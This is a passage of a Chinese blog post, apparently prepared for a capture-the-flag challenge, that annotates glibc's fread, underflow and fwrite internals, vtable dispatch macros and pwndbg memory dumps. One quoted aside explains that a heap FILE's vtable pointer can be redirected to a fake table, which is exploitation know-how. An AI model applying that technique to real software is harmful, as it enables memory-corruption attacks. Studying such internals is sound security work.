fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      		<span class="keyword">else</span></span><br><span class="line">					fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">	      		<span class="keyword">break</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		s += count;</span><br><span class="line">	  		want -= count;											<span class="comment">//到此want可能还有剩下的最后不完整的一块,下一次循环时刷新缓冲区满足</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    		_IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="underflow">underflow</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__underflow @</span><br><span class="line">	-&gt;_IO_new_file_underflow @fileops.c:<span class="number">469</span></span><br><span class="line">		指针复位</span><br><span class="line">		-&gt;_IO_file_read</span><br><span class="line">			-&gt;_IO_new_file_underflow</span><br><span class="line">				-&gt;__read(fp-&gt;_fileno, buf, size)</span><br></pre></td></tr></table></figure>
<p>fread调用的underflow和fwrite调用的overflow是一对兄弟函数</p>
<p>underflow意思是从文件往缓冲区载入数据,维持读缓冲区满</p>
<p>overflow意思是从缓冲区向文件写入数据,维持写缓冲区空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)<span class="comment">//如果当前fp字节流使用宽字节,则调用fwide</span></span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))<span class="comment">//如果当前fp处于写入状态,则切换状态为读取状态</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//如果缓冲区还有东西则返回当前read_ptr指向的字节</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))			</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_IO_UNDERFLOW</code>实际上调用的_<code>IO_new_file_underflow</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_new_file_underflow(FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)		<span class="comment">//必须要有READ权限</span></span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno(EBADF);</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//如果缓冲区还有剩余的东西,则不允许刷新</span></span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)		<span class="comment">//如果还没有建立缓冲区,现在就建立</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">        _IO_doallocbuf(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))		<span class="comment">//对于行缓冲和无缓冲的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">       required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">       traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">       not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">       explicitly.  --drepper */</span></span><br><span class="line">        _IO_acquire_lock(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">            _IO_OVERFLOW(<span class="built_in">stdout</span>, EOF);<span class="comment">//刷新stdout缓冲</span></span><br><span class="line"></span><br><span class="line">        _IO_release_lock(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _IO_switch_to_get_mode(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">       pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">       we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">       input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<span class="comment">//缓冲区复位</span></span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">    count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base,		<span class="comment">//缓冲区更新,从文件读取,塞满整个缓冲区</span></span><br><span class="line">                        fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">            fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fp-&gt;_IO_read_end += count;			<span class="comment">//读缓冲区根据实际count数决定</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">       handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">       unset it.  */</span></span><br><span class="line">        fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="vtable何时发挥作用">vtable何时发挥作用?</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br></pre></td></tr></table></figure>
<p>从<code>_IO_sgetn</code>调用<code>_IO_file_xsgetn</code>时首先需要‘调用’<code>_IO_XSGETN</code>,这实际上是一个宏定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br></pre></td></tr></table></figure>
<p>如果展开这个宏</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_IO_XSGETN(FP, DATA, N) </span><br><span class="line">= JUMP2 (__xsgetn, FP, DATA, N)</span><br><span class="line">= (_IO_JUMPS_FUNC(FP)-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_JUMPS_FILE_plus (FP))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_CAST_FIELD_ACCESS ((FP), struct _IO_FILE_plus, vtable))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (FP-&gt;vtable)[__xsgetn] ) (FP, DATA, N)</span><br><span class="line"></span><br><span class="line">IO_validate_vtable接受一个vtable指针,原封不动地返回,只对这个vtable做一些校验</span><br><span class="line">=(FP-&gt;vtable)[__xsgetn](FP, DATA, N)</span><br><span class="line"></span><br><span class="line">__xsgetn可以理解为偏移量或者枚举值</span><br><span class="line">fp的vtable表中偏移量为__xsgetn处就是_IO_file_xsgetn</span><br><span class="line">=_IO_file_xsgetn (FP, DATA, N)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>还有一种思路是保持真表不变,但是篡改真表上的函数指针</p>
<p>但是前提是真表所在的内存区块可写</p>
<p>然而事实上不可写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all.vtable</span><br><span class="line">$5 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">pwndbg&gt; info target</span><br><span class="line">	...</span><br><span class="line">	0x00007ffff7dcd900 - 0x00007ffff7dd0ba0 is .data.rel.ro in /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	...</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">	...</span><br><span class="line"> 0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>只可读</p>
<p>因此只能考虑当<code>_IO_list_all</code>位于堆区时,修改其vtable指针指向假表</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$25 = (struct _IO_FILE_plus *) 0x602010</span><br><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$26 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x6020f0,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x602100,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/30gx file</span><br><span class="line">0x602010:       0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x00007ffff7dd2540</span><br><span class="line">0x602080:       0x0000000000000003      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x00000000006020f0</span><br><span class="line">0x6020a0:       0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x6020b0:       0x0000000000602100      0x0000000000000000</span><br><span class="line">0x6020c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020e0:       0x0000000000000000      0x00007ffff7dd06e0	//此处为vtable指针</span><br><span class="line">0x6020f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x602000           0x623000 rw-p    21000 0      [heap]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">subgraph stack[&quot;stack&quot;]</span><br><span class="line"></span><br><span class="line">	subgraph main [&quot;main frame&quot;]</span><br><span class="line">		filepointer[&quot;FILE* file&quot;]</span><br><span class="line">		style filepointer fill:RED</span><br><span class="line">	end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">subgraph glibcdata [&quot;glibc memory&quot;]</span><br><span class="line">	subgraph table [&quot;_IO_file_jumps&quot;]</span><br><span class="line">			__xsputn[&quot;__xsputn&quot;]</span><br><span class="line">			__xsgetn[&quot;__xsgetn&quot;]</span><br><span class="line">			etc[&quot;...&quot;]</span><br><span class="line">			style __xsputn fill:RED</span><br><span class="line">			style __xsgetn fill:RED</span><br><span class="line">			style etc fill:RED</span><br><span class="line">	end</span><br><span class="line">	style table fill:GREEN</span><br><span class="line">	</span><br><span class="line">	xsputn[&quot;_IO_new_file_xsputn&quot;]</span><br><span class="line">  	xsgetn[&quot;__GI__IO_file_xsgetn&quot;]</span><br><span class="line">  	style xsputn fill:YELLOW</span><br><span class="line">  	style xsgetn fill:YELLOW</span><br><span class="line">  	</span><br><span class="line">  	subgraph plus1[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stderr[&quot;struct FILE stderr&quot;]</span><br><span class="line">  		vtable1[&quot;vtable&quot;]</span><br><span class="line">  		</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus2[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdout[&quot;struct FILE stdout&quot;]</span><br><span class="line">  		vtable2[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus3[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdin[&quot;struct FILE stdin&quot;]</span><br><span class="line">  		vtable3[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	</span><br><span class="line">  	listhead[&quot;_IO_list_all&quot;]</span><br><span class="line">  	style listhead fill:RED</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	style vtable1 fill:RED</span><br><span class="line">  	style vtable2 fill:RED</span><br><span class="line">  	style vtable3 fill:RED</span><br><span class="line">  	style stderr fill:GREEN</span><br><span class="line">	style stdout fill:GREEN</span><br><span class="line">	style stdin fill:GREEN</span><br><span class="line">	style plus1 fill:GREEN</span><br><span class="line">	style plus2 fill:GREEN</span><br><span class="line">	style plus3 fill:GREEN</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">subgraph heap [&quot;heap&quot;]</span><br><span class="line">	subgraph plus [&quot;_IO_FILE_plus&quot;]</span><br><span class="line">		file[&quot;struct FILE file&quot;]</span><br><span class="line">		vtable[&quot;vtable&quot;]	</span><br><span class="line">		style file fill:GREEN</span><br><span class="line">		style vtable fill:RED</span><br><span class="line">	end	</span><br><span class="line">	style plus fill:GREEN</span><br><span class="line">	</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filepointer--&gt;file</span><br><span class="line">vtable----&gt;table</span><br><span class="line"></span><br><span class="line">file--chain--&gt;stderr--chain--&gt;stdout--chain--&gt;stdin--chain--&gt;null</span><br><span class="line">  	__xsputn--&gt;xsputn</span><br><span class="line">  	__xsgetn--&gt;xsgetn</span><br><span class="line">listhead--&gt;plus1</span><br><span class="line">  </span><br><span class="line">subgraph example [&quot;图例&quot;]</span><br><span class="line">	function[&quot;函数&quot;]</span><br><span class="line">	style function fill:YELLOW</span><br><span class="line">	struct[&quot;对象&quot;]</span><br><span class="line">	style struct fill:GREEN</span><br><span class="line">	pointer[&quot;指针&quot;]</span><br><span class="line">	style pointer fill:RED</span><br><span class="line">end</span><br><span class="line">style example fill:GRAY</span><br></pre></td></tr></table></figure>
<p><strong>综上,fopen的作用是,创建一个新的<code>_IO_FILE_plus</code>结构体(包括FILE和vtable两部分)并初始化之,然后头插法将其链接到<code>_IO_list_all</code>链表上</strong></p>
<h3 id="fwrite">fwrite</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>
<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流
<strong>stream</strong> 中。</p>
<p>写入<code>size</code>大小的单位<code>nmemb</code>个</p>
<p>实际上调用跳转表函数<code>vtable.__xsputn</code></p>
<p>整个调用过程链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flowchart TB</span><br><span class="line">fwrite[fwrite]</span><br><span class="line">_IO_fwrite[_IO_fwrite @ glibc-2.38/libio/iofwrite.c:32]</span><br><span class="line">_IO_file_xsputn[_IO_new_file_xsputn @ glibc-2.38/libio/fileops.c:1197]</span><br><span class="line">_IO_file_overflow[</span><br><span class="line">	_IO_new_file_overflow @ glibc-2.38/libio/fileops.c:733</span><br><span class="line">	也会调用_IO_do_write将现有的缓冲区写入文件</span><br><span class="line">	然后缓冲区指针复位</span><br><span class="line">]</span><br><span class="line">_IO_do_write[_IO_new_do_write @ glibc-2.38/libio/fileops.c:425]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_do_write[</span><br><span class="line">	new_do_write @ 